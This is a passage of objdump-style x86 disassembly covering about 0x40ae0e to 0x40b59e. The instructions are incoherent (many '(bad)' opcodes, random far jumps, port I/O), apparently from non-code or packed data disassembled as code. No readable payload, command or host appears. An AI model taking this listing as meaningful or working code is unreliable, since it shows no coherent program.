  40ae0e:	outs   dx,BYTE PTR ds:[esi]
  40ae0f:	push   ds
  40ae10:	popf   
  40ae11:	or     esi,esi
  40ae13:	mov    DWORD PTR [edi],ebx
  40ae15:	out    0xf8,eax
  40ae17:	aad    0xf0
  40ae19:	add    esi,DWORD PTR [edx]
  40ae1b:	adc    al,0x2e
  40ae1d:	lahf   
  40ae1e:	and    DWORD PTR [edx+0x77],ebp
  40ae21:	icebp  
  40ae22:	aad    0x72
  40ae24:	push   edi
  40ae25:	add    eax,0xea129631
  40ae2a:	push   es
  40ae2b:	fwait
  40ae2c:	add    bl,BYTE PTR [eax-0xde57589]
  40ae32:	pop    eax
  40ae33:	or     dl,dl
  40ae35:	fimul  DWORD PTR [ebp+eax*2+0x6d3ea0a0]
  40ae3c:	ret    0xca8c
  40ae3f:	imul   ecx,edi,0xafc5655d
  40ae45:	inc    ebp
  40ae46:	push   esp
  40ae47:	lock aad 0x75
  40ae4a:	dec    esi
  40ae4b:	test   edi,esi
  40ae4d:	adc    eax,0x4a47dd9f
  40ae52:	into   
  40ae53:	in     eax,dx
  40ae54:	push   eax
  40ae55:	gs (bad) 
  40ae57:	cld    
  40ae58:	xor    edx,DWORD PTR [ebp+0x25f86c3a]
  40ae5e:	xchg   DWORD PTR [ecx-0x4b42401e],edx
  40ae64:	xchg   esp,eax
  40ae65:	and    eax,0x4fe070f9
  40ae6a:	das    
  40ae6b:	jecxz  0x40ae1b
  40ae6d:	jge    0x40aecc
  40ae6f:	scas   eax,DWORD PTR es:[edi]
  40ae70:	mov    edx,0x2df3f063
  40ae75:	ins    DWORD PTR es:[edi],dx
  40ae76:	pop    edi
  40ae77:	xchg   esi,eax
  40ae78:	shl    esi,cl
  40ae7a:	clc    
  40ae7b:	mov    bl,0x1e
  40ae7d:	mov    ebx,0x6a4d4bfc
  40ae82:	cmp    BYTE PTR [eax+0x5c],cl
  40ae85:	stos   BYTE PTR es:[edi],al
  40ae86:	pusha  
  40ae87:	scas   al,BYTE PTR es:[edi]
  40ae88:	leave  
  40ae89:	push   esi
  40ae8a:	fldpi  
  40ae8c:	bound  edi,QWORD PTR [edx-0x76]
  40ae8f:	inc    edx
  40ae90:	(bad)  
  40ae92:	sbb    esi,DWORD PTR [ebx]
  40ae94:	pop    esp
  40ae95:	jge    0x40ae79
  40ae97:	xlat   BYTE PTR ds:[ebx]
  40ae98:	cmc    
  40ae99:	mov    gs,WORD PTR [ebx]
  40ae9b:	ficom  WORD PTR [edi-0x37]
  40ae9e:	and    al,0xcf
  40aea0:	inc    edx
  40aea1:	jp     0x40aeac
  40aea3:	sub    BYTE PTR [esi+0x7293a2d5],bh
  40aea9:	in     eax,dx
  40aeaa:	cli    
  40aeab:	jl     0x40aeaf
  40aead:	xor    ch,BYTE PTR [eax+0x30b2d190]
  40aeb3:	mov    edx,0x74337563
  40aeb8:	inc    ebp
  40aeb9:	fld    DWORD PTR [eax]
  40aebb:	shr    ch,1
  40aebd:	js     0x40ae98
  40aebf:	fidivr DWORD PTR [ebp+0x339cd68b]
  40aec5:	cdq    
  40aec6:	cwde   
  40aec7:	mov    edi,0x54fdbd
  40aecc:	outs   dx,DWORD PTR ds:[esi]
  40aecd:	shr    DWORD PTR [edi-0x3e8133db],0xd2
  40aed4:	aas    
  40aed5:	popf   
  40aed6:	mov    dl,0xa6
  40aed8:	jnp    0x40af16
  40aeda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aedb:	test   bl,dh
  40aedd:	std    
  40aede:	pop    esi
  40aedf:	jp     0x40af5e
  40aee1:	jo     0x7bb57ed0
  40aee7:	jle    0x40ae6d
  40aee9:	repz sub edx,eax
  40aeec:	ss into 
  40aeee:	mov    ecx,0x64308dcf
  40aef3:	int3   
  40aef4:	mov    edi,0xec092fc4
  40aef9:	arpl   WORD PTR [esi],di
  40aefb:	push   ebx
  40aefc:	dec    edx
  40aefd:	popf   
  40aefe:	sahf   
  40aeff:	ins    DWORD PTR es:[edi],dx
  40af00:	jmp    0x894f:0x4d8d5ad6
  40af07:	test   dl,0x8c
  40af0a:	mov    ebp,0x8b8ab6e7
  40af0f:	scas   al,BYTE PTR es:[edi]
  40af10:	inc    ebx
  40af11:	jge    0x40af88
  40af13:	push   edi
  40af14:	sbb    BYTE PTR [eax-0x4f454b90],bh
  40af1a:	sub    dh,BYTE PTR [ebx+0x24c5aa5e]
  40af20:	xlat   BYTE PTR ds:[ebx]
  40af22:	mov    esi,0xe6b9cc5b
  40af27:	sub    eax,0x7220347a
  40af2c:	enter  0xb3fe,0x38
  40af30:	xor    eax,ebp
  40af32:	mov    al,ds:0x799ffdc0
  40af37:	cwde   
  40af38:	out    0xc1,eax
  40af3a:	add    dl,BYTE PTR [esi]
  40af3c:	cmp    ecx,esp
  40af3e:	push   ss
  40af3f:	ds sub al,0x3e
  40af42:	jg     0x40aec8
  40af44:	push   ebx
  40af45:	fisub  WORD PTR [esp+edi*4-0x669deb45]
  40af4c:	loope  0x40af42
  40af4e:	push   edi
  40af4f:	xchg   edx,eax
  40af50:	inc    ebx
  40af51:	jmp    0x3011:0x97ad25df
  40af58:	jmp    0x40aee6
  40af5a:	mov    bh,0x6
  40af5c:	sub    al,0xef
  40af5e:	pop    ss
  40af5f:	enter  0xe9b9,0x13
  40af63:	push   cs
  40af64:	pusha  
  40af65:	imul   esi,ebx,0x6e
  40af68:	repnz fisubr DWORD PTR [edi+0x7a]
  40af6c:	jmp    0x1b2:0xc9867bc7
  40af73:	sbb    DWORD PTR [ebx+0x2cd2d02c],0xae959136
  40af7d:	fld    DWORD PTR [ebp+0x6e4a88c8]
  40af83:	jb     0x40af5e
  40af85:	mov    edx,0xaa30ef43
  40af8a:	push   esi
  40af8b:	scas   al,BYTE PTR es:[edi]
  40af8c:	fbstp  TBYTE PTR [eax-0x535736be]
  40af92:	bound  ebp,QWORD PTR [edi]
  40af94:	fsubr  DWORD PTR [ebx+0x62583cd]
  40af9a:	fs push eax
  40af9c:	mov    esp,0x449cc2d2
  40afa1:	mov    edx,0x5f748188
  40afa6:	ds cmp al,0xf8
  40afa9:	xchg   ecx,eax
  40afaa:	outs   dx,DWORD PTR ds:[esi]
  40afab:	popa   
  40afac:	pop    edi
  40afad:	imul   eax,ecx,0x6f
  40afb0:	pop    esp
  40afb1:	push   ebx
  40afb2:	inc    edx
  40afb3:	adc    DWORD PTR [edx],edx
  40afb5:	or     DWORD PTR [esi-0x13],ebp
  40afb8:	adc    DWORD PTR [ebx],0x8bdfe549
  40afbe:	sub    al,0x9
  40afc0:	sbb    cl,bh
  40afc2:	xor    ah,BYTE PTR [edx]
  40afc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40afc5:	adc    edx,edi
  40afc7:	retf   0x23d9
  40afca:	in     eax,0xfb
  40afcc:	add    ebp,DWORD PTR [ebp-0x4870ce82]
  40afd2:	loopne 0x40aff3
  40afd4:	inc    ebp
  40afd5:	pusha  
  40afd6:	add    esi,edi
  40afd8:	int3   
  40afd9:	push   esi
  40afda:	aas    
  40afdb:	dec    edi
  40afdc:	in     eax,dx
  40afdd:	mov    esi,fs
  40afdf:	sub    eax,0x8ce2233d
  40afe4:	or     al,0x1c
  40afe6:	lods   al,BYTE PTR ds:[esi]
  40afe7:	lahf   
  40afe8:	sbb    al,0x9e
  40afea:	iret   
  40afeb:	enter  0xdf2,0x5
  40afef:	mov    ah,0xaf
  40aff1:	jne    0x40af74
  40aff3:	mov    ecx,0xa3b31a32
  40aff8:	lea    ebp,[eax+0x76e57b64]
  40affe:	retf   0x3571
  40b001:	(bad)  
  40b002:	or     al,0x8a
  40b004:	or     al,0xd3
  40b006:	and    al,0x8
  40b008:	xor    ch,BYTE PTR [ecx]
  40b00a:	lods   eax,DWORD PTR ds:[esi]
  40b00b:	mov    ecx,0x298124b5
  40b010:	dec    edx
  40b011:	loopne 0x40b08b
  40b013:	mov    al,0xfc
  40b015:	addr16 push ss
  40b017:	xlat   BYTE PTR ds:[ebx]
  40b018:	pop    esp
  40b019:	push   esp
  40b01a:	fisttp DWORD PTR [eax+0x7b9c9937]
  40b020:	int3   
  40b021:	xchg   edx,eax
  40b022:	cmp    esi,DWORD PTR [eax+0x47]
  40b025:	lods   eax,DWORD PTR ds:[esi]
  40b026:	hlt    
  40b027:	adc    cl,al
  40b029:	or     edi,esp
  40b02b:	retf   0x2d81
  40b02e:	push   ds
  40b02f:	xchg   edi,eax
  40b030:	or     eax,0x55d2f695
  40b035:	fchs   
  40b037:	jl     0x40b025
  40b039:	shl    BYTE PTR [eax],1
  40b03b:	aaa    
  40b03c:	div    bh
  40b03e:	pop    ds
  40b03f:	stc    
  40b040:	fadd   QWORD PTR [ebp-0x7f]
  40b043:	sub    al,0x4a
  40b045:	hlt    
  40b046:	jle    0x40b09a
  40b048:	pop    esi
  40b049:	(bad)  
  40b04a:	in     eax,0x62
  40b04c:	aaa    
  40b04d:	pop    ds
  40b04e:	ins    DWORD PTR es:[edi],dx
  40b04f:	mov    esi,0x28697068
  40b054:	push   ds
  40b055:	jmp    0x73f6:0xfa0967b3
  40b05c:	cwde   
  40b05d:	dec    eax
  40b05e:	lods   al,BYTE PTR ds:[esi]
  40b05f:	(bad)  
  40b060:	push   esp
  40b061:	adc    BYTE PTR [eax+0x72],bl
  40b064:	in     al,dx
  40b065:	bound  edx,QWORD PTR [edi+0x5]
  40b068:	out    0x33,eax
  40b06a:	push   es
  40b06b:	inc    esp
  40b06c:	repz lds esp,FWORD PTR [edi-0xa302f55]
  40b073:	sub    BYTE PTR [eax-0xd],dh
  40b076:	xchg   edi,eax
  40b077:	test   BYTE PTR [esi-0x14f20dd5],0xe9
  40b07e:	cmp    ebp,eax
  40b080:	lock test eax,0x89a12847
  40b086:	push   ds
  40b087:	or     BYTE PTR [eax-0x59],0xd5
  40b08b:	xchg   ebp,eax
  40b08c:	ds int3 
  40b08e:	pop    esi
  40b08f:	rcl    BYTE PTR [eax],1
  40b091:	fisub  DWORD PTR [eax+ebx*1]
  40b094:	cmp    edx,ecx
  40b096:	or     BYTE PTR [edx],ah
  40b098:	jle    0x40b021
  40b09a:	dec    ebx
  40b09b:	(bad)  [eax]
  40b09d:	push   ebp
  40b09e:	xchg   ebx,eax
  40b09f:	jl     0x40b0a7
  40b0a1:	and    dh,bl
  40b0a3:	pop    ecx
  40b0a4:	mov    ebp,0x34cc1374
  40b0a9:	imul   esp,DWORD PTR [esi],0xffffffca
  40b0ac:	add    BYTE PTR [ecx],cl
  40b0ae:	ins    BYTE PTR es:[edi],dx
  40b0af:	jnp    0x40b07f
  40b0b1:	add    DWORD PTR [eax+0xc],esi
  40b0b4:	pop    esi
  40b0b5:	sbb    dl,BYTE PTR [ebx-0x6b]
  40b0b8:	dec    edx
  40b0b9:	sbb    DWORD PTR [ecx-0x6212ae3b],edx
  40b0bf:	in     al,0x1b
  40b0c1:	test   BYTE PTR [edx-0x3d2fe6ac],0x33
  40b0c8:	xor    eax,0xa33cb186
  40b0cd:	jmp    0x40b09d
  40b0cf:	test   eax,0xf2720396
  40b0d4:	xchg   esp,eax
  40b0d5:	mov    ebx,0xf18734ab
  40b0da:	jo     0x40b0f6
  40b0dc:	jge    0x40b0ad
  40b0de:	int3   
  40b0df:	fstp   QWORD PTR [esi-0x77]
  40b0e2:	sbb    DWORD PTR [ecx+edx*1-0x7eb9980b],0x4f
  40b0ea:	out    0x5a,al
  40b0ec:	lds    edx,FWORD PTR [esi]
  40b0ee:	shl    BYTE PTR [ecx],cl
  40b0f0:	cmp    esp,DWORD PTR [edi+0xc]
  40b0f3:	test   DWORD PTR [ebp+0xd],0x40b4463
  40b0fa:	jnp    0x40b10e
  40b0fc:	loopne 0x40b0c1
  40b0fe:	pop    es
  40b0ff:	mov    al,ds:0x8f76df43
  40b104:	inc    eax
  40b105:	push   ds
  40b106:	mov    eax,0x819cb4d1
  40b10b:	jmp    0x82cd:0x3f1550e1
  40b112:	sub    eax,ecx
  40b114:	in     eax,dx
  40b115:	jg     0x40b0a4
  40b117:	and    ebx,ebx
  40b119:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b11a:	push   ss
  40b11b:	aad    0x68
  40b11d:	icebp  
  40b11e:	xchg   DWORD PTR [ebx+eiz*1-0x9de5919],edi
  40b125:	jecxz  0x40b169
  40b127:	in     al,dx
  40b128:	adc    eax,0xb5ac52e8
  40b12d:	inc    esp
  40b12e:	jle    0x40b0cc
  40b130:	dec    edx
  40b131:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b132:	cmp    esi,DWORD PTR [edx+0x31f52de8]
  40b138:	inc    edx
  40b139:	cmc    
  40b13a:	xchg   edi,eax
  40b13b:	sbb    edx,DWORD PTR [esi-0x104c8aca]
  40b141:	mov    eax,ds:0xde27d8b9
  40b146:	in     eax,0x37
  40b148:	xor    cl,BYTE PTR [ebx-0x651f9e57]
  40b14e:	leave  
  40b14f:	arpl   ax,cx
  40b151:	enter  0xa562,0x1f
  40b155:	sbb    ah,dh
  40b157:	jmp    0xecd96951
  40b15c:	push   es
  40b15d:	lock aad 0x64
  40b160:	mov    dl,0xe3
  40b162:	pop    ds
  40b163:	clc    
  40b164:	aaa    
  40b165:	push   edi
  40b166:	in     al,0xe2
  40b168:	aas    
  40b169:	loope  0x40b120
  40b16b:	jg     0x40b1b1
  40b16d:	(bad)  
  40b16e:	sbb    DWORD PTR [ebx+0x46f1f601],esp
  40b174:	sub    DWORD PTR [ebx],edx
  40b176:	push   edi
  40b177:	js     0x40b1b7
  40b179:	(bad)  [edx-0x15]
  40b17c:	mov    edi,0x76479072
  40b181:	test   BYTE PTR [ecx],dl
  40b183:	or     eax,0x77985a20
  40b188:	jmp    0xba775dd3
  40b18d:	inc    esi
  40b18e:	mov    al,0xd3
  40b190:	adc    DWORD PTR [edi+0x3c],ebp
  40b193:	inc    ecx
  40b194:	scas   al,BYTE PTR es:[edi]
  40b195:	bound  esi,QWORD PTR [edx]
  40b197:	push   0x2b71ec38
  40b19c:	test   ebp,edi
  40b19e:	imul   eax,DWORD PTR [edx-0x5d5eb550],0xfc618c3e
  40b1a8:	mov    dl,0x76
  40b1aa:	mov    fs,WORD PTR [ebx]
  40b1ac:	dec    ebx
  40b1ad:	data16 xor BYTE PTR [esi+0x5b],dl
  40b1b1:	fwait
  40b1b2:	loope  0x40b1c3
  40b1b4:	shl    ah,cl
  40b1b6:	cs jno 0x40b159
  40b1b9:	loopne 0x40b1a4
  40b1bb:	and    al,0xb1
  40b1bd:	adc    ah,BYTE PTR [edi+0x64229141]
  40b1c3:	mov    eax,ds:0x299bd0d6
  40b1c8:	cdq    
  40b1c9:	pop    ds
  40b1ca:	fidiv  WORD PTR [esi+eiz*2]
  40b1cd:	jae    0x40b1f8
  40b1cf:	sar    BYTE PTR [esi+edi*4],cl
  40b1d2:	jmp    0x40b207
  40b1d4:	(bad)  
  40b1d5:	imul   esp,DWORD PTR [ebp-0x38],0xffffff98
  40b1d9:	test   DWORD PTR [esp+eax*1],esp
  40b1dc:	dec    ebx
  40b1dd:	add    esi,esp
  40b1df:	lock ins DWORD PTR es:[edi],dx
  40b1e1:	fldcw  WORD PTR [ebp-0x323fd553]
  40b1e7:	cli    
  40b1e8:	(bad)  
  40b1e9:	cmp    dh,ch
  40b1eb:	xchg   ecx,eax
  40b1ec:	aaa    
  40b1ed:	aas    
  40b1ee:	mov    ?,WORD PTR [eax+ebp*2+0x7ce117ef]
  40b1f5:	mov    BYTE PTR [ecx],ch
  40b1f7:	sbb    eax,0x28ac5004
  40b1fc:	(bad)  
  40b1fd:	and    DWORD PTR [eax+0x5bf7c9aa],eax
  40b203:	dec    esi
  40b204:	add    bl,bl
  40b206:	add    al,0xbe
  40b208:	mov    edi,0xcf99443e
  40b20d:	mov    bl,0x3f
  40b20f:	jb     0x40b276
  40b211:	xor    eax,0x691fcf67
  40b216:	xchg   ebp,eax
  40b217:	push   ebp
  40b218:	in     eax,0xc6
  40b21a:	loope  0x40b288
  40b21c:	xchg   edx,eax
  40b21d:	xchg   edi,eax
  40b21e:	jmp    0xac94327f
  40b223:	mov    ds:0xe7143cbf,eax
  40b228:	es sti 
  40b22a:	sub    ebp,ecx
  40b22c:	mov    WORD PTR [ebp-0x5d570e3f],?
  40b232:	pop    ebx
  40b233:	ficom  WORD PTR [ebx-0x1a057681]
  40b239:	and    esi,DWORD PTR [ebx]
  40b23b:	jnp    0x40b230
  40b23d:	stc    
  40b23e:	ins    DWORD PTR es:[edi],dx
  40b23f:	call   0x1dd7:0xfb3e9839
  40b246:	sub    eax,0x3485713
  40b24b:	jecxz  0x40b1e1
  40b24d:	sbb    ah,BYTE PTR [esi]
  40b24f:	mov    ebx,0x2d0c8a1e
  40b254:	dec    edx
  40b255:	in     eax,0xad
  40b257:	jmp    0xdc9b:0x59137f93
  40b25e:	and    BYTE PTR [ebp-0x54],bh
  40b261:	mov    al,ds:0x1268d2a7
  40b266:	ror    DWORD PTR [edx-0x1622001c],1
  40b26c:	fsub   DWORD PTR [edi-0x123b925e]
  40b272:	mov    ebx,0xeb43be40
  40b277:	sub    edx,edx
  40b279:	lods   al,BYTE PTR ds:[esi]
  40b27a:	out    0xaa,al
  40b27c:	and    dl,BYTE PTR [edx]
  40b27e:	scas   al,BYTE PTR es:[edi]
  40b27f:	mov    ebp,DWORD PTR [eax-0x38]
  40b282:	pop    esp
  40b283:	scas   al,BYTE PTR es:[edi]
  40b284:	xchg   BYTE PTR [esi],dl
  40b286:	fld    QWORD PTR [ecx-0x4636220c]
  40b28c:	push   edi
  40b28d:	ds xchg esp,eax
  40b28f:	frstor [esi+0x3d749862]
  40b295:	clc    
  40b296:	pop    edx
  40b297:	retf   
  40b298:	push   ebp
  40b299:	mov    ebp,0x94cf95c8
  40b29e:	in     eax,0x55
  40b2a0:	pop    edi
  40b2a1:	shl    dl,cl
  40b2a3:	dec    eax
  40b2a4:	cmc    
  40b2a5:	pop    eax
  40b2a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b2a7:	lods   eax,DWORD PTR ds:[esi]
  40b2a8:	into   
  40b2a9:	pop    esp
  40b2aa:	jmp    0x3e20:0xf942351e
  40b2b1:	adc    DWORD PTR [ecx+0x4683bdb5],edx
  40b2b7:	and    eax,0x10cd88eb
  40b2bc:	sbb    al,0xcb
  40b2be:	(bad)  
  40b2bf:	add    eax,DWORD PTR [edi+ecx*8+0xbc48d56]
  40b2c6:	mov    ebp,0xd3f171d
  40b2cb:	aad    0xb7
  40b2cd:	lods   eax,DWORD PTR ds:[esi]
  40b2ce:	ins    BYTE PTR es:[edi],dx
  40b2cf:	aas    
  40b2d0:	popa   
  40b2d1:	push   ecx
  40b2d2:	pop    edx
  40b2d3:	xor    eax,0x33578572
  40b2d8:	adc    al,0xe1
  40b2da:	xor    al,0x17
  40b2dc:	inc    edx
  40b2dd:	sbb    bl,ch
  40b2df:	or     DWORD PTR [ebp+ecx*8+0x2b],ebx
  40b2e3:	nop
  40b2e4:	popa   
  40b2e5:	leave  
  40b2e6:	mov    eax,ds:0xb41f94b
  40b2eb:	sahf   
  40b2ec:	mov    ch,BYTE PTR [ebp-0x565afbc7]
  40b2f2:	pop    esi
  40b2f3:	sbb    DWORD PTR [edx+0x0],edi
  40b2f6:	cmp    cl,BYTE PTR [ebp+0x29058c66]
  40b2fc:	(bad)  
  40b2fd:	jo     0x40b2b2
  40b2ff:	xor    esi,DWORD PTR [ebx+0x719e5a00]
  40b305:	imul   esi,DWORD PTR [edx+0x346c4abd],0xffffff96
  40b30c:	bound  ebp,QWORD PTR [esi-0xa]
  40b30f:	stos   DWORD PTR es:[edi],eax
  40b310:	push   es
  40b311:	das    
  40b312:	stc    
  40b313:	jne    0x40b2e3
  40b315:	lods   al,BYTE PTR ds:[esi]
  40b316:	es (bad) 
  40b318:	out    dx,al
  40b319:	jge    0x40b34b
  40b31b:	std    
  40b31c:	inc    ecx
  40b31d:	mov    ds:0x5ca75d81,al
  40b322:	enter  0x8a69,0x63
  40b326:	sub    esp,DWORD PTR [ebp-0x1c6a3a11]
  40b32c:	das    
  40b32d:	shr    BYTE PTR [edx+0x73],cl
  40b330:	pop    edi
  40b331:	ret    0xece9
  40b334:	in     eax,0x23
  40b336:	mov    edx,0x5e521c9c
  40b33b:	out    dx,al
  40b33c:	push   ecx
  40b33d:	push   ebx
  40b33e:	test   DWORD PTR [edi+0x6f6e6790],esi
  40b344:	sbb    BYTE PTR [esi],dh
  40b346:	outs   dx,BYTE PTR ds:[esi]
  40b347:	idiv   BYTE PTR [eax+0x3a907267]
  40b34d:	dec    ebp
  40b34e:	cmp    DWORD PTR [eax-0x29],ebx
  40b351:	fwait
  40b352:	loopne 0x40b3a1
  40b354:	aad    0x2a
  40b356:	fsubr  DWORD PTR [ecx+0x57]
  40b359:	mov    ds:0xf47683b2,al
  40b35e:	pop    esp
  40b35f:	push   eax
  40b360:	sub    ecx,edx
  40b362:	out    0x47,al
  40b364:	sbb    DWORD PTR [ecx+eax*1+0x48],esp
  40b368:	jmp    0x2f90cc49
  40b36d:	mov    ecx,0x9096148e
  40b372:	sbb    BYTE PTR [ebp-0x49],0xeb
  40b376:	sub    DWORD PTR [eax+0x2d],ebx
  40b379:	ret    
  40b37a:	pop    esp
  40b37b:	out    dx,eax
  40b37c:	leave  
  40b37d:	ds fucomi st,st(0)
  40b380:	bound  ecx,QWORD PTR [ebp-0x34]
  40b383:	scas   eax,DWORD PTR es:[edi]
  40b384:	fbld   TBYTE PTR [eax]
  40b386:	mov    ecx,esp
  40b388:	mov    bh,BYTE PTR [ebx-0x71aa0ac9]
  40b38e:	mov    al,ds:0x66bc396b
  40b393:	repz mov bl,0x68
  40b396:	dec    edi
  40b397:	push   ebp
  40b398:	inc    esp
  40b399:	adc    DWORD PTR [ebp+0x76],0xbd4fe0c
  40b3a0:	lock fnstcw WORD PTR [ecx+0xd8e9e4c]
  40b3a7:	pop    edx
  40b3a8:	cld    
  40b3a9:	xor    BYTE PTR [eax-0x1f],dl
  40b3ac:	iret   
  40b3ad:	lahf   
  40b3ae:	mov    eax,ds:0x96a32e36
  40b3b3:	pop    es
  40b3b4:	call   0x8e8eeb52
  40b3b9:	cs enter 0x70d9,0x31
  40b3be:	xchg   ecx,eax
  40b3bf:	pop    esp
  40b3c0:	out    0x97,eax
  40b3c2:	pop    es
  40b3c3:	jmp    0x40b3bc
  40b3c5:	xchg   edi,eax
  40b3c6:	sub    eax,0x959591f
  40b3cb:	shl    DWORD PTR [esi+ebx*1+0x4],cl
  40b3cf:	shl    BYTE PTR [esp+esi*8-0xffc82e1],1
  40b3d6:	cmp    ch,dl
  40b3d8:	push   edx
  40b3d9:	cmc    
  40b3da:	pusha  
  40b3db:	lods   al,BYTE PTR ds:[esi]
  40b3dc:	test   al,0x66
  40b3de:	ss aas 
  40b3e0:	aas    
  40b3e1:	mov    esp,DWORD PTR [ebx]
  40b3e3:	xor    al,0x3e
  40b3e5:	push   cs
  40b3e6:	jnp    0x40b3b6
  40b3e8:	pop    esi
  40b3e9:	test   eax,0x4c19988
  40b3ee:	push   ds
  40b3ef:	and    eax,0xf98f2afe
  40b3f4:	inc    edx
  40b3f5:	mov    ?,WORD PTR [eax-0x1517c059]
  40b3fb:	push   ebp
  40b3fc:	mov    edx,0xf2b0135a
  40b401:	jge    0x40b43e
  40b403:	je     0x40b457
  40b405:	jp     0x40b40b
  40b407:	mov    cl,0x4a
  40b409:	inc    esp
  40b40a:	push   esi
  40b40b:	test   al,0x48
  40b40d:	jne    0x40b429
  40b40f:	int3   
  40b410:	inc    esp
  40b411:	test   BYTE PTR [edx+0x5d],bl
  40b414:	jl     0x40b41a
  40b416:	call   DWORD PTR [edx+0x4ee660c8]
  40b41c:	cs jecxz 0x40b44b
  40b41f:	add    dh,cl
  40b421:	sbb    eax,0x7494f9bd
  40b426:	or     BYTE PTR [eax+0x72],dl
  40b429:	jmp    0x40b488
  40b42b:	nop
  40b42c:	rcl    DWORD PTR ds:0x68f16f19,1
  40b432:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b433:	out    0x3f,al
  40b435:	xchg   ecx,eax
  40b436:	stc    
  40b437:	loopne 0x40b45a
  40b439:	jl     0x40b454
  40b43b:	xor    eax,0xbbde14df
  40b440:	mov    ds:0x8f030c30,al
  40b445:	or     edi,DWORD PTR [esi-0x2c731af4]
  40b44b:	add    BYTE PTR [esi-0x6b],0xf7
  40b44f:	sub    al,0x37
  40b451:	dec    ebx
  40b452:	lock cmp eax,0xa616ed8f
  40b458:	je     0x40b406
  40b45a:	pop    edi
  40b45b:	jge    0x40b4ca
  40b45d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b45e:	mov    BYTE PTR [edi],ch
  40b460:	fucomi st,st(7)
  40b462:	sub    ebp,DWORD PTR ds:0x715c07dc
  40b468:	mov    bl,cl
  40b46a:	jbe    0x40b4b3
  40b46c:	sub    DWORD PTR [edx-0x6048f8af],ebp
  40b472:	inc    esp
  40b473:	lea    ecx,[esi+0x2e]
  40b476:	fadd   st(0),st
  40b478:	mov    edi,0x369090de
  40b47d:	outs   dx,BYTE PTR gs:[esi]
  40b47f:	push   edx
  40b480:	aad    0x20
  40b482:	adc    esi,eax
  40b484:	adc    BYTE PTR [edi],0x99
  40b487:	jns    0x40b415
  40b489:	bound  ebp,QWORD PTR [ecx]
  40b48b:	mov    eax,DWORD PTR [ecx]
  40b48d:	and    eax,DWORD PTR [edi+0x78bd2d8f]
  40b493:	mov    bl,0x29
  40b495:	(bad)  
  40b496:	sub    ecx,DWORD PTR [edi]
  40b498:	pop    edi
  40b499:	rol    DWORD PTR [ecx-0x1c38a88],1
  40b49f:	std    
  40b4a0:	imul   esi,DWORD PTR [edx],0xd83cd418
  40b4a6:	cmp    al,0xef
  40b4a8:	xor    dh,BYTE PTR [edx-0x7a]
  40b4ab:	rcr    BYTE PTR [esi+0x6d],1
  40b4ae:	push   edx
  40b4af:	xchg   DWORD PTR [edx],ebp
  40b4b1:	loope  0x40b522
  40b4b3:	dec    edi
  40b4b4:	repnz imul ebx,DWORD PTR [ebp-0x49684f0e],0xffffffe4
  40b4bc:	sub    eax,edi
  40b4be:	int    0x18
  40b4c0:	test   edx,ecx
  40b4c2:	xlat   BYTE PTR ds:[ebx]
  40b4c3:	and    DWORD PTR [ebp+0x73],edx
  40b4c6:	icebp  
  40b4c7:	xchg   ebp,eax
  40b4c8:	daa    
  40b4c9:	rol    BYTE PTR [ebp-0xd],1
  40b4cc:	lea    esi,[esi]
  40b4ce:	loope  0x40b4f4
  40b4d0:	in     al,dx
  40b4d1:	ja     0x40b50c
  40b4d3:	mov    edi,DWORD PTR [ebx-0x50]
  40b4d6:	mov    eax,0x611ceecb
  40b4db:	pop    ebp
  40b4dc:	dec    ebx
  40b4dd:	and    ecx,edi
  40b4df:	mov    BYTE PTR ds:0x35a18c45,cl
  40b4e5:	mov    cl,cl
  40b4e7:	fnstsw WORD PTR [esi+0x15]
  40b4ea:	jmp    0x3074375a
  40b4ef:	xchg   DWORD PTR [bp+di],ebp
  40b4f2:	out    0x3,eax
  40b4f4:	sub    dh,BYTE PTR [eax-0x7a252b28]
  40b4fa:	in     eax,0xab
  40b4fc:	or     eax,DWORD PTR [eax-0x113f6466]
  40b502:	clc    
  40b503:	in     al,dx
  40b504:	sbb    bh,dh
  40b506:	mov    dh,ch
  40b508:	jmp    0xa75b0233
  40b50d:	inc    edx
  40b50e:	cld    
  40b50f:	jmp    0x40b4eb
  40b511:	ins    BYTE PTR es:[edi],dx
  40b512:	sbb    BYTE PTR [edx-0xc],ch
  40b515:	sbb    al,0x62
  40b517:	add    BYTE PTR [esi-0x3d959bed],al
  40b51d:	jmp    0xaca1:0x69ee2460
  40b524:	popa   
  40b525:	in     eax,dx
  40b526:	jne    0x40b4d5
  40b528:	pop    ebp
  40b529:	mov    al,ds:0xcf825c0
  40b52e:	add    DWORD PTR [edi],edi
  40b530:	push   ebx
  40b531:	mov    dl,0x81
  40b533:	inc    eax
  40b534:	jo     0x40b50c
  40b536:	outs   dx,DWORD PTR ds:[esi]
  40b537:	sub    DWORD PTR [eax-0x79],ebx
  40b53a:	xchg   esp,eax
  40b53b:	sahf   
  40b53c:	(bad)  
  40b53d:	bnd jns 0x40b5ab
  40b540:	jmp    0x47afc18e
  40b545:	xlat   BYTE PTR ds:[ebx]
  40b546:	dec    edi
  40b547:	jo     0x40b502
  40b549:	sub    ebp,DWORD PTR [ecx-0x57]
  40b54c:	inc    eax
  40b54d:	inc    ebp
  40b54e:	mov    ebp,0x9120324f
  40b553:	cmp    al,0x36
  40b555:	imul   edi
  40b557:	lock push eax
  40b559:	data16 mov dh,0x21
  40b55c:	sbb    edi,DWORD PTR [ebx+0x5a0447f4]
  40b562:	and    DWORD PTR [ebp+0x7d],edi
  40b565:	mov    edx,0x3c39d29c
  40b56a:	fwait
  40b56b:	mov    ah,0xb5
  40b56d:	fild   QWORD PTR [eax+eiz*2-0x69e4f1be]
  40b574:	add    DWORD PTR [eax+0x9],0x4fa1c53c
  40b57b:	mov    ah,BYTE PTR [ebp+0x54a037fd]
  40b581:	je     0x40b5a3
  40b583:	adc    al,0xcb
  40b585:	xchg   BYTE PTR [ebx+0x4b],ch
  40b588:	loopne 0x40b538
  40b58a:	pop    ds
  40b58b:	ja     0x40b5e0
  40b58d:	cwde   
  40b58e:	xchg   DWORD PTR [ebx],edx
  40b590:	jge    0x40b580
  40b592:	(bad)  
  40b593:	(bad)  
  40b594:	cld    
  40b595:	mov    BYTE PTR [ebx+0x7d1066bc],al
  40b59b:	rcr    DWORD PTR [ebx],1
  40b59d:	std    
  40b59e:	or     ebp,edi
